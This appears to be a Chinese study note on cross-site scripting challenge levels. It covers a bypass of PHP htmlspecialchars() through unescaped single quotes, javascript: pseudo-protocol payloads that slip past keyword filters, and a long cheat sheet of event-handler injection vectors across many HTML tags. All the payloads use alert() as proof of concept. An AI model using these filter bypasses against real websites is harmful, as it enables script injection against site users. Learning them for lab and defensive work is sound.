# Day 9 

## 2019/07/16

### XSS 

#### 第三关的htmlspecialchars() 绕过

这个函数的用法参见
```
http://www.w3school.com.cn/php/func_string_htmlspecialchars.asp
```

**示例：**

```php
<?php 
	$name = $_GET["name"];
	$name = htmlspecialchars($name);
?>
 
<input type='text' value='<?php echo $name?>'>
```
注意一下这个函数的几个重要参数

ENT_COMPAT - `默认。`仅编码双引号。

ENT_QUOTES - 编码双引号和单引号。

ENT_NOQUOTES - 不编码任何引号。

默认是只编码双引号的！默认只编码双引号！默认只编码双引号……

payload:`keyword=111'onmouseover='javascript:alert(1)`

因为默认参数只让双引号转义而不让单引号转义，所以可以构造闭合

#### 第五关使用构造伪协议

源码里面看到

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
```

传统方法构造的payload里面的字符串会被替换掉

所以可以用下面的构造出伪协议


`"><iframe src=javascript:alert(1)>`

`"> <a href="javascript:alert(1)">click</a>`

`"> <a href="javascript:%61lert(1)">click</a> //`

![img1](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/0716_1.png)



























#### 各种标签的用法

##### **\<scirpt\>**

`<scirpt>alert("xss");</script>`

##### **\<img\>**

`<img src=1 onerror=alert("xss");>`
##### **\<input\>**

`<input onfocus="alert('xss');">`

竞争焦点，从而触发onblur事件

`<input onblur=alert("xss") autofocus><input autofocus>`

通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发

`<input onfocus="alert('xss');" autofocus>`

##### **\<details\>**

`<details ontoggle="alert('xss');">`

使用open属性触发ontoggle事件，无需用户去触发

`<details open ontoggle="alert('xss');">`

##### **\<svg\>**

`<svg onload=alert("xss");>`

##### **\<select\>**

`<select onfocus=alert(1)></select>`

通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发

`<select onfocus=alert(1) autofocus>`

##### **\<iframe\>**

`<iframe onload=alert("xss");></iframe>`

##### **\<video\>**

`<video><source onerror="alert(1)">`

##### **\<audio\>**

`<audio src=x  onerror=alert("xss");>`

##### **\<body\>**

`<body/onload=alert("xss");>`

利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

`<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>`

##### **\<textarea\>**

`<textarea onfocus=alert("xss"); autofocus>`

##### **\<keygen\>**

`<keygen autofocus onfocus=alert(1)> //仅限火狐`

##### **\<marquee\>**

`<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以`

##### **\<isindex\>**

`<isindex type=image src=1 onerror=alert("xss")>//仅限于IE`


#### js伪协议

##### **\<a\>标签**

`<a href="javascript:alert(`xss`);">xss</a>`

##### \<iframe\>标签

`<iframe src=javascript:alert('xss');></iframe>`

##### **\<img\>标签**

`<img src=javascript:alert('xss')>//IE7以下`

##### **\<form\>标签**

`<form action="Javascript:alert(1)"><input type=submit>`

### copied from:
```
https://xz.aliyun.com/t/4067
```